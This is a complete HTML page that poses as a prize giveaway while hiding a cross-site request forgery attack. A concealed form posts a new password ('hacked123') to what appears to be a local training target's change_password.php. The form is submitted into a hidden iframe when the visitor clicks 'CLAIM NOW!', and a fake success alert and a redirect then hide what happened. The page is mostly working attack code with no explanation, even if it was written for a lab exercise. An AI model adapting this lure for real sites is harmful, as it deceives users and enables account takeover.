<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Free Prize!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f0f8ff;
            text-align: center;
        }
        h1 {
            color: #ff6600;
        }
        .prize-container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .prize-image {
            width: 200px;
            height: 200px;
            margin: 20px auto;
            background-color: #ffd700;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        .button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 10px 2px;
            cursor: pointer;
            border-radius: 5px;
            border: none;
        }
        .hidden-form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="prize-container">
        <h1>Congratulations! You've Won a Prize!</h1>
        <p>You are our lucky visitor today and have been selected to receive a special gift!</p>
        
        <div class="prize-image">üéÅ</div>
        
        <p>Click the button below to claim your prize now!</p>
        
        <button id="claimButton" class="button">CLAIM NOW!</button>
    </div>
    
    <!-- Hidden CSRF Attack Form -->
    <iframe name="hiddenFrame" style="display:none"></iframe>
    <form id="csrfForm" action="http://localhost/vulnerabilities/csrf/change_password.php" method="POST" target="hiddenFrame" class="hidden-form">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    
    <script>
        // Submit the CSRF form when the claim button is clicked
        document.getElementById('claimButton').addEventListener('click', function() {
            document.getElementById('csrfForm').submit();
            setTimeout(function() {
                alert('Congratulations! Your prize has been claimed and will be delivered soon!');
                window.location.href = 'https://www.google.com';
            }, 1000);
        });
    </script>
</body>
</html>
